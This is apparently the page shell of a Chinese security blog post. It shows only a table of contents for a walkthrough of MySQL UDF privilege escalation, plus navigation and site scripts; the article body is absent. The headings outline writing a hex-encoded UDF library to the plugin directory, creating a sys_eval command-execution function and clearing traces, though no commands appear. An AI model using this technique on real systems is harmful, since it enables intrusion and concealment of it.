<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/27/Linux%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%E4%B8%80/">← 下一篇 Linux提权学习之rbash逃逸</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/24/kioptrix_level%201.3/">vulnhub-kioptrix_level 1.3 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 MySQL-udf 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 利用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-%E5%B8%B8%E8%A7%84%E6%83%85%E5%86%B5%EF%BC%9A"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 常规情况：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 特殊情况：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%EF%BC%9A"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">查看当前数据库用户权限：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 版本特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81-Mysql-5-0"><span class="toc-number">2.3.1.</span> <span class="toc-text">1、 Mysql &lt; 5.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81-5-0-Mysql-5-1"><span class="toc-number">2.3.2.</span> <span class="toc-text">2、 5.0 &lt;&#x3D; Mysql &lt; 5.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81-Mysql-5-1"><span class="toc-number">2.3.3.</span> <span class="toc-text">3、 Mysql &gt;&#x3D; 5.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-UDF%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 UDF文件位置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81sqlmap%EF%BC%9A"><span class="toc-number">2.4.1.</span> <span class="toc-text">1、sqlmap：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81metaspliot%EF%BC%9A"><span class="toc-number">2.4.2.</span> <span class="toc-text">2、metaspliot：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 操作步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%9F%A5%E7%9C%8B%E5%8F%AF%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.5.1.</span> <span class="toc-text">1、查看可导出文件位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">2.5.2.</span> <span class="toc-text">2、查看当前数据库用户权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E7%A1%AE%E8%AE%A4mysql%E5%AE%89%E8%A3%85%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.5.3.</span> <span class="toc-text">3、确认mysql安装位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E9%80%9A%E8%BF%87%E4%B8%BB%E6%9C%BA%E7%89%88%E6%9C%AC%E5%8F%8A%E6%9E%B6%E6%9E%84%E7%A1%AE%E8%AE%A4mysql%E4%BD%8D%E6%95%B0%E6%9D%A5%E9%80%89%E7%94%A8udf%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.4.</span> <span class="toc-text">4、通过主机版本及架构确认mysql位数来选用udf文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC%EF%BC%8C%E5%88%A4%E6%96%ADudf%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.5.5.</span> <span class="toc-text">5、查看数据库版本，判断udf文件写入位置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-mysql%E5%A4%A7%E4%BA%8E5-1%E7%89%88%E6%9C%AC%E6%97%B6"><span class="toc-number">2.5.5.1.</span> <span class="toc-text">5.1 mysql大于5.1版本时</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#5-1-2-sqlmap-udf%E6%96%87%E4%BB%B6%E8%A7%A3%E7%A0%81"><span class="toc-number">2.5.5.1.1.</span> <span class="toc-text">5.1.2 sqlmap udf文件解码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-1-3-16%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81udf%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.5.1.2.</span> <span class="toc-text">5.1.3 16进制编码udf文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-1-4-udf%E5%86%99%E5%85%A5plugin%E7%9B%AE%E5%BD%95"><span class="toc-number">2.5.5.1.3.</span> <span class="toc-text">5.1.4 udf写入plugin目录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-1-5-%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%A1%A8%E5%B9%B6%E5%B0%86%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%8F%92%E5%85%A5%E5%88%B0%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E6%B5%81"><span class="toc-number">2.5.5.1.4.</span> <span class="toc-text">5.1.5 创建一个表并将二进制数据插入到十六进制编码流</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-1-6-%E9%9A%8F%E4%BE%BF%E9%80%89%E6%8B%A9%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8E%EF%BC%8C%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%A1%A8"><span class="toc-number">2.5.5.1.5.</span> <span class="toc-text">5.1.6 随便选择一个数据库后，创建一个表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-1-7-insert%E6%8F%92%E5%85%A5%E7%AC%AC%E4%B8%80%E6%AE%B5%E6%95%B0%E6%8D%AE"><span class="toc-number">2.5.5.1.6.</span> <span class="toc-text">5.1.7 insert插入第一段数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-1-8-update%E6%8B%BC%E6%8E%A5%E5%89%A9%E4%BD%99%E6%95%B0%E6%8D%AE"><span class="toc-number">2.5.5.1.7.</span> <span class="toc-text">5.1.8 update拼接剩余数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-1-9-%E5%AF%BC%E5%87%BA%E8%A1%A8%E4%B8%AD%E6%95%B0%E6%8D%AE%E5%88%B0%E7%B3%BB%E7%BB%9F%E7%A3%81%E7%9B%98"><span class="toc-number">2.5.5.1.8.</span> <span class="toc-text">5.1.9 导出表中数据到系统磁盘</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-mysql%E5%B0%8F%E4%BA%8E5-1%E7%89%88%E6%9C%AC%E6%97%B6%EF%BC%9A"><span class="toc-number">2.5.5.2.</span> <span class="toc-text">5.2 mysql小于5.1版本时：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81%E5%88%9B%E5%BB%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.6.</span> <span class="toc-text">6、创建命令执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.5.7.</span> <span class="toc-text">7、命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 痕迹清除</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-1-%E5%88%A0%E9%99%A4%E8%A1%A8"><span class="toc-number">2.6.1.</span> <span class="toc-text">2.6.1 删除表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-2-%E5%88%A0%E9%99%A4%E5%87%BD%E6%95%B0"><span class="toc-number">2.6.2.</span> <span class="toc-text">2.6.2 删除函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98"><span class="toc-number">2.7.</span> <span class="toc-text">2.7 其他问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81ERROR-1125-HY000"><span class="toc-number">2.7.1.</span> <span class="toc-text">1、ERROR 1125 (HY000)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%8F%90%E7%A4%BAsys-eval-%E5%87%BD%E6%95%B0%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%EF%BC%8C%E4%BD%86%E6%97%A0%E6%B3%95%E5%88%A9%E7%94%A8"><span class="toc-number">2.7.2.</span> <span class="toc-text">2、提示sys_eval 函数已经存在，但无法利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%88%9B%E5%BB%BAsys-eval-%E5%87%BD%E6%95%B0%E6%97%B6%E6%8F%90%E7%A4%BA%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%EF%BC%8C%E4%BD%86%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%A0%E9%99%A4%E6%97%B6%E6%8F%90%E7%A4%BA-sys-eval"><span class="toc-number">2.7.3.</span> <span class="toc-text">3、创建sys_eval 函数时提示已经存在，但利用与删除时提示 sys_eval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81ERROR-1126-HY000"><span class="toc-number">2.7.4.</span> <span class="toc-text">4、ERROR 1126 (HY000)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-8-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.8.</span> <span class="toc-text">2.8 修复建议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 Linux-UDF提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>